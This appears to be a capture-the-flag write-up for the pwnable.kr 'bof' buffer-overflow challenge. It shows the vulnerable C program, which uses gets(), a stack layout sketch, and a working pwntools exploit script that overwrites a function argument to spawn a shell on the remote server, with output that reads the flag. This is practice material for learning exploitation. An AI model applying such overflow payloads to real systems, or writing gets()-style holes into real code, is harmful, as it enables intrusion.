# BOF

---
Source Code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```
Object dump

---
<img width="1440" alt="Screenshot 2024-12-08 at 2 39 49 AM" src="https://github.com/user-attachments/assets/692ad475-7e44-4766-abf8-c167114e3e1b">


---
| FFF      | 	        
| -------- | 	     
|          | 
| KEY(overflow) | 
| eip = 4 bytes     | 
| ebp = 4 bytes     | 
|   0x2c = 44 bytes   | 
|0x00      |        

---
exp.py

```python
from pwn import *

context.binary = binary = "./bof"

payload = b'a'*44
payload += b'b'*4
payload += b'c'*4
payload += p32(0xcafebabe)

p = process()
p = remote('pwnable.kr', 9000)

p.sendline(payload)
p.interactive()
```

Running the exploit..........
---
```bash
❯ python3 exp.py
[*] '/home/lynk/pwnable/bof/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/lynk/pwnable/bof/bof': pid 6144
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
[*] Got EOF while reading in interactive
$

```

